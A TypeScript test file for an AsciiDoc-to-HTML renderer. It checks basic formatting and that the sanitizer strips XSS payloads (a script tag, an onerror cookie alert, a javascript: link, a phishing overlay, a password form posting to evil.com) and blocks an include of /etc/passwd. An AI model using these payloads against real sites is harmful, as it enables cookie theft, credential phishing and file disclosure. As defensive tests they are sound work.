// @{"req": ["REQ-FECOURSE-629", "REQ-FECONTENT-225"]}

import { describe, it, expect } from 'vitest'
import { renderAsciidoc } from './renderAsciidoc'

function parse(html: string): Document {
  return new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html')
}

describe('renderAsciidoc — basic document structure', () => {
  it('renders document title as h1, section heading as h2, and list items', async () => {
    const source = '= Title\n\n== Week 1\n\n* item'
    const html = await renderAsciidoc(source)
    const doc = parse(html)

    // Document title (= Title) renders as <h1>
    const h1 = doc.querySelector('h1')
    expect(h1).not.toBeNull()
    expect(h1!.textContent).toContain('Title')

    // Section heading (== Week 1) renders as <h2>
    const h2 = doc.querySelector('h2')
    expect(h2).not.toBeNull()
    expect(h2!.textContent).toContain('Week 1')

    // Bullet list item renders in a <ul><li>
    const li = doc.querySelector('ul li')
    expect(li).not.toBeNull()
    expect(li!.textContent).toContain('item')
  })

  it('renders tables from AsciiDoc table syntax', async () => {
    const source = '= Doc\n\n|===\n| Col A | Col B\n\n| cell 1\n| cell 2\n|===\n'
    const html = await renderAsciidoc(source)
    const doc = parse(html)

    const table = doc.querySelector('table')
    expect(table).not.toBeNull()

    // Cells should contain the text
    const text = doc.body.textContent ?? ''
    expect(text).toContain('Col A')
    expect(text).toContain('Col B')
    expect(text).toContain('cell 1')
    expect(text).toContain('cell 2')
  })

  it('renders code blocks with pre and code elements', async () => {
    const source = '= Doc\n\n[source,js]\n----\nconst x = 1;\n----\n'
    const html = await renderAsciidoc(source)
    const doc = parse(html)

    const pre = doc.querySelector('pre')
    expect(pre).not.toBeNull()
    const code = pre!.querySelector('code')
    expect(code).not.toBeNull()
    expect(code!.textContent).toContain('const x = 1;')
  })

  it('renders bold and italic inline formatting', async () => {
    const source = '= Doc\n\nThis is *bold* and _italic_ text.\n'
    const html = await renderAsciidoc(source)
    const doc = parse(html)

    const strong = doc.querySelector('strong')
    expect(strong).not.toBeNull()
    expect(strong!.textContent).toBe('bold')

    const em = doc.querySelector('em')
    expect(em).not.toBeNull()
    expect(em!.textContent).toBe('italic')
  })
})

describe('renderAsciidoc — XSS sanitization (security boundary)', () => {
  it('strips script from passthrough block +++<script>window.x=1</script>+++', async () => {
    const source = '= Doc\n\n+++<script>window.x=1</script>+++\n'
    const html = await renderAsciidoc(source)

    // The sanitizer must remove the script element entirely
    expect(html).not.toContain('<script')
    expect(html).not.toContain('window.x')

    const doc = parse(html)
    const scripts = doc.querySelectorAll('script')
    expect(scripts.length).toBe(0)
  })

  it('strips onerror from pass:[<img onerror=...>] passthrough block', async () => {
    const source = '= Doc\n\npass:[<img onerror="alert(document.cookie)" src="x">]\n'
    const html = await renderAsciidoc(source)

    // The sanitizer must strip the onerror attribute
    expect(html).not.toContain('onerror')

    const doc = parse(html)
    const imgs = doc.querySelectorAll('img')
    for (const img of Array.from(imgs)) {
      expect(img.getAttribute('onerror')).toBeNull()
    }
  })

  it('strips javascript: href from passthrough link', async () => {
    const source = '= Doc\n\n+++<a href="javascript:alert(1)">click</a>+++\n'
    const html = await renderAsciidoc(source)

    const doc = parse(html)
    const anchors = doc.querySelectorAll('a')
    for (const a of Array.from(anchors)) {
      expect(a.getAttribute('href') ?? '').not.toMatch(/^javascript:/i)
    }
  })

  it('strips style attribute (position:fixed phishing vector) from passthrough div', async () => {
    const source = '= Doc\n\n+++<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">Phishing</div>+++\n'
    const html = await renderAsciidoc(source)

    expect(html).not.toContain('position:fixed')
    expect(html).not.toContain('position: fixed')

    const doc = parse(html)
    const div = doc.querySelector('div')
    if (div) {
      expect(div.getAttribute('style')).toBeNull()
    }
  })

  it('strips form and input from passthrough block', async () => {
    const source = '= Doc\n\n+++<form action="https://evil.com"><input name="pw" type="password"></form>+++\n'
    const html = await renderAsciidoc(source)

    expect(html).not.toContain('<form')
    expect(html).not.toContain('<input')
  })
})

describe('renderAsciidoc — include:: directive isolation (secure mode)', () => {
  it('does not include /etc/passwd content — renders harmlessly without file data', async () => {
    const source = '= Doc\n\ninclude::/etc/passwd[]\n'
    const html = await renderAsciidoc(source)

    // In secure mode, include:: is not processed. The directive either renders
    // as a harmless link/text or is silently dropped. Under no circumstances
    // should the contents of /etc/passwd appear.
    expect(html).not.toContain('root:')
    expect(html).not.toContain('/bin/bash')
    expect(html).not.toContain('/bin/sh')
  })
})

describe('renderAsciidoc — return type', () => {
  it('returns a string', async () => {
    const html = await renderAsciidoc('= Hello\n\nworld\n')
    expect(typeof html).toBe('string')
  })

  it('returns empty-ish output for empty input without throwing', async () => {
    const html = await renderAsciidoc('')
    expect(typeof html).toBe('string')
    // Should not throw; output may be empty or minimal wrapper divs
  })
})
